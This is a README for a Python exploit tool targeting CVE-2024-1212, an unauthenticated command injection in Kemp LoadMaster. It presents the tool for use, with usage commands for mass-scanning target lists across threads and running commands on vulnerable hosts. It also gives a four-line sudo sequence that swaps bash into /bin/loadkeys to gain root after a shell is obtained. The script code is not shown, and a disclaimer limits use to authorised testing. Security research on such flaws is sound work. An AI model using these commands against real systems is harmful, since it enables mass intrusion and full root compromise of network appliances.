# CVE-2024-1212 Command Injection Exploit for Kemp LoadMaster 🛡️🔓

This Python script is designed as a proof of concept (PoC) to demonstrate an unauthenticated command injection vulnerability in Kemp LoadMaster, identified as CVE-2024-1212. 

## Features 🌟

- Scan a single target or multiple targets for the CVE-2024-1212 vulnerability.
- Execute commands on vulnerable targets.
- Utilize multi-threading for faster scanning of multiple targets.
- Save vulnerable targets to an output file for further analysis.

## Usage 🚀

To use this script, Python 3 must be installed on your system. You can execute the script in the terminal or command prompt as follows:

```bash
python exploit.py --url "http://target-url.com"
```

To scan multiple targets from a file:

```bash
python exploit.py -f targets.txt -o vulnerable.txt -t 50
```

### Options

- `-u`, `--url`: Specify a target URL for command injection.
- `-f`, `--file`: Specify a file containing target URLs to scan.
- `-o`, `--output`: Specify an output file for saving scan results.
- `-t`, `--threads`: Specify the number of threads to use for scanning.

## Disclaimer ⚠️

This tool is provided for educational purposes only and is designed to help security professionals test the vulnerability of their own systems. Unauthorized testing on systems that you do not have explicit permission to test is illegal and unethical. Use this tool responsibly.

## Privilege Escalation 🛡️

Once a shell has been obtained, privilege escalation can be achieved by following these commands as per the researcher's guidance:

```bash
sudo /bin/cp /bin/loadkeys /tmp/loadkeys
sudo /bin/cp /bin/bash /bin/loadkeys
sudo /bin/loadkeys -c /bin/bash
cp /tmp/loadkeys /bin/loadkeys
```

## Resources 📚

This PoC was inspired by research from Rhino Security Labs. For more detailed information about CVE-2024-1212 and its implications, please visit [their research page](https://rhinosecuritylabs.com/research/cve-2024-1212unauthenticated-command-injection-in-progress-kemp-loadmaster/?utm_content=286496380&utm_medium=social&utm_source=twitter&hss_channel=tw-1184539364).